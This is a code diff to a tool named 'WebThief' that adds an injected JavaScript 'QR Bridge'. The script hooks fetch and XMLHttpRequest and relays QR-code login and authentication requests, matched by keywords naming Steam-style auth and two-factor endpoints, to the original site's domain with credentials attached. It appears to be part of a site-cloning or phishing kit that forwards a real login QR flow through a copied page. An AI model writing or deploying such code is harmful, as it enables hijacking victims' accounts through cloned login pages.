@@ -5,12 +5,9 @@
 
 from __future__ import annotations
 
-import re
-import base64
 from typing import Any
-from urllib.parse import urlparse
 
-from playwright.async_api import Page, Route, Request
+from playwright.async_api import Page
 from rich.console import Console
 
 console = Console()
@@ -52,7 +49,9 @@ class QRInterceptor:
             const QR_KEYWORDS = [
                 'qrcode', 'qr_code', 'login/qr', 'auth/qr',
                 'getqr', 'qrlogin', 'qrscan', 'qrcheck',
-                'steamqr', 'wechatqr', 'qqlogin'
+                'viaqr', 'beginauthsession', 'pollauthsession',
+                'authenticationservice', 'steamguard', 'twofactor',
+                'jwt/ajaxrefresh'
             ];
             
             // 检测 URL 是否为二维码相关
@@ -235,50 +234,86 @@ class QRInterceptor:
             // ━━━ WebThief QR Bridge Script ━━━
             
             const ORIGINAL_DOMAIN = '{original_domain}';
-            
-            // 创建 CORS 代理
-            function createCORSProxy(url) {{
-                // 如果是相对路径，补全为原站域名
-                if (url.startsWith('/')) {{
-                    return ORIGINAL_DOMAIN + url;
-                }}
-                return url;
+            const QR_KEYWORDS = [
+                'qrcode', 'qr_code', 'login/qr', 'auth/qr',
+                'getqr', 'qrlogin', 'qrscan', 'qrcheck',
+                'viaqr', 'beginauthsession', 'pollauthsession',
+                'authenticationservice', 'steamguard', 'twofactor',
+                'jwt/ajaxrefresh'
+            ];
+
+            function normalizeUrl(input) {{
+                try {{
+                    if (typeof input === 'string') return input;
+                    if (input && typeof input.url === 'string') return input.url;
+                }} catch (e) {{}}
+                return '';
             }}
-            
-            // 重写 fetch 以支持跨域二维码请求
-            const _origFetch = window.fetch;
-            window.fetch = function(url, options) {{
-                const urlStr = typeof url === 'string' ? url : url.url;
-                
-                // 检测二维码 API
-                const qrKeywords = ['qrcode', 'qr_code', 'login/qr', 'auth/qr'];
-                const isQRRequest = qrKeywords.some(kw => urlStr.toLowerCase().includes(kw));
-                
-                if (isQRRequest) {{
-                    const proxiedUrl = createCORSProxy(urlStr);
-                    console.log('[WebThief QR Bridge] 代理二维码请求:', proxiedUrl);
-                    
-                    // 添加 CORS 头
-                    const newOptions = {{
-                        ...options,
-                        mode: 'cors',
-                        credentials: 'include'
-                    }};
-                    
-                    return _origFetch(proxiedUrl, newOptions);
+
+            function isLikelyQRRequest(url) {{
+                const normalized = (url || '').toLowerCase();
+                if (!normalized) return false;
+                return QR_KEYWORDS.some(kw => normalized.includes(kw));
+            }}
+
+            function createCORSProxy(url) {{
+                if (!url) return url;
+                try {{
+                    return new URL(url, ORIGINAL_DOMAIN).href;
+                }} catch (e) {{
+                    if (typeof url === 'string' && url.startsWith('/')) {{
+                        return ORIGINAL_DOMAIN + url;
+                    }}
+                    return url;
                 }}
-                
-                return _origFetch.apply(this, arguments);
-            }};
+            }}
+
+            const _origFetch = window.fetch;
+            if (typeof _origFetch === 'function') {{
+                window.fetch = function(url, options) {{
+                    const urlStr = normalizeUrl(url);
+                    const isQRRequest = isLikelyQRRequest(urlStr);
+                    
+                    if (isQRRequest) {{
+                        const proxiedUrl = createCORSProxy(urlStr);
+                        console.log('[WebThief QR Bridge] 代理二维码请求:', proxiedUrl);
+
+                        const newOptions = {{
+                            ...(options || {{}})
+                        }};
+                        if (!newOptions.credentials) {{
+                            newOptions.credentials = 'include';
+                        }}
+
+                        return _origFetch.call(this, proxiedUrl, newOptions);
+                    }}
+                    
+                    return _origFetch.apply(this, arguments);
+                }};
+            }}
+
+            if (window.XMLHttpRequest && window.XMLHttpRequest.prototype) {{
+                const _origXHROpen = window.XMLHttpRequest.prototype.open;
+                window.XMLHttpRequest.prototype.open = function(method, url) {{
+                    const urlStr = normalizeUrl(url);
+                    if (isLikelyQRRequest(urlStr)) {{
+                        const proxiedUrl = createCORSProxy(urlStr);
+                        console.log('[WebThief QR Bridge] 代理二维码 XHR:', proxiedUrl);
+                        arguments[1] = proxiedUrl;
+                        try {{ this.withCredentials = true; }} catch (e) {{}}
+                    }}
+                    return _origXHROpen.apply(this, arguments);
+                }};
+            }}
             
             // 定时刷新二维码（如果页面有刷新逻辑）
             window.__webthief_qr_refresh = function() {{
                 console.log('[WebThief QR Bridge] 触发二维码刷新');
                 
-                // 查找二维码刷新函数（常见命名）
                 const refreshFunctions = [
                     'refreshQRCode', 'updateQRCode', 'getNewQRCode',
-                    'qrRefresh', 'reloadQR', 'fetchQRCode'
+                    'qrRefresh', 'reloadQR', 'fetchQRCode',
+                    'startQRLogin', 'generateQRCode'
                 ];
                 
                 for (const fnName of refreshFunctions) {{
